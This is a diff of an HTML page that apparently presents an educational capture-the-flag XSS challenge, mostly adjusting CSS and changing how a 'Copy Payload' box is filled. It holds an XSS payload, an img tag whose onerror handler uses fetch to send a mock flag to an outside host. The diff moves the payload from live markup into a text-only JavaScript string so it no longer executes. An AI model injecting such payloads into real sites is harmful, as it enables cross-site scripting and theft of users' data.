@@ -37,9 +37,11 @@
       font-size: 12px;
       line-height: 1.8;
       overflow-x: auto;
-      white-space: pre;
+      white-space: pre-wrap;
+      word-break: break-all;
       color: #00ff88;
       margin-bottom: 10px;
+      font-family: 'Courier New', monospace;
     }
     .copy-btn {
       display: block;
@@ -54,6 +56,7 @@
       cursor: pointer;
       margin-top: 8px;
     }
+    .copy-btn:active { opacity: 0.7; }
     .warning {
       background: rgba(255,204,0,0.08);
       border: 1px solid rgba(255,204,0,0.3);
@@ -69,7 +72,7 @@
       border-radius: 6px;
       padding: 20px;
       text-align: center;
-      font-size: 18px;
+      font-size: 16px;
       color: #00ff88;
       font-weight: 700;
     }
@@ -87,7 +90,7 @@
 <!-- PAYLOAD MOCK -->
 <div class="card">
   <div class="label">💉 Payload Challenge - Mock Flag</div>
-  <div class="code-box" id="payload"><img src=x onerror=fetch(`https://ctf-challenge-anha1.vercel.app/?flag=CTF{edukasi_xss_aman}`)></div>
+  <div class="code-box" id="payload"></div>
   <button class="copy-btn" onclick="copyPayload()">📋 Copy Payload</button>
 </div>
 
@@ -100,9 +103,12 @@
 </div>
 
 <script>
+  // Payload diisi pake JS biar nggak ke-render HTML
+  const payloadText = `<img src=x onerror=fetch(\`https://ctf-challenge-anha1.vercel.app/?flag=CTF{edukasi_xss_aman}\`)>`;
+  document.getElementById('payload').textContent = payloadText;
+
   function copyPayload() {
-    const text = document.getElementById('payload').textContent;
-    navigator.clipboard.writeText(text).then(() => {
+    navigator.clipboard.writeText(payloadText).then(() => {
       const btn = document.querySelector('.copy-btn');
       btn.textContent = '✅ Tersalin!';
       setTimeout(() => btn.textContent = '📋 Copy Payload', 2000);
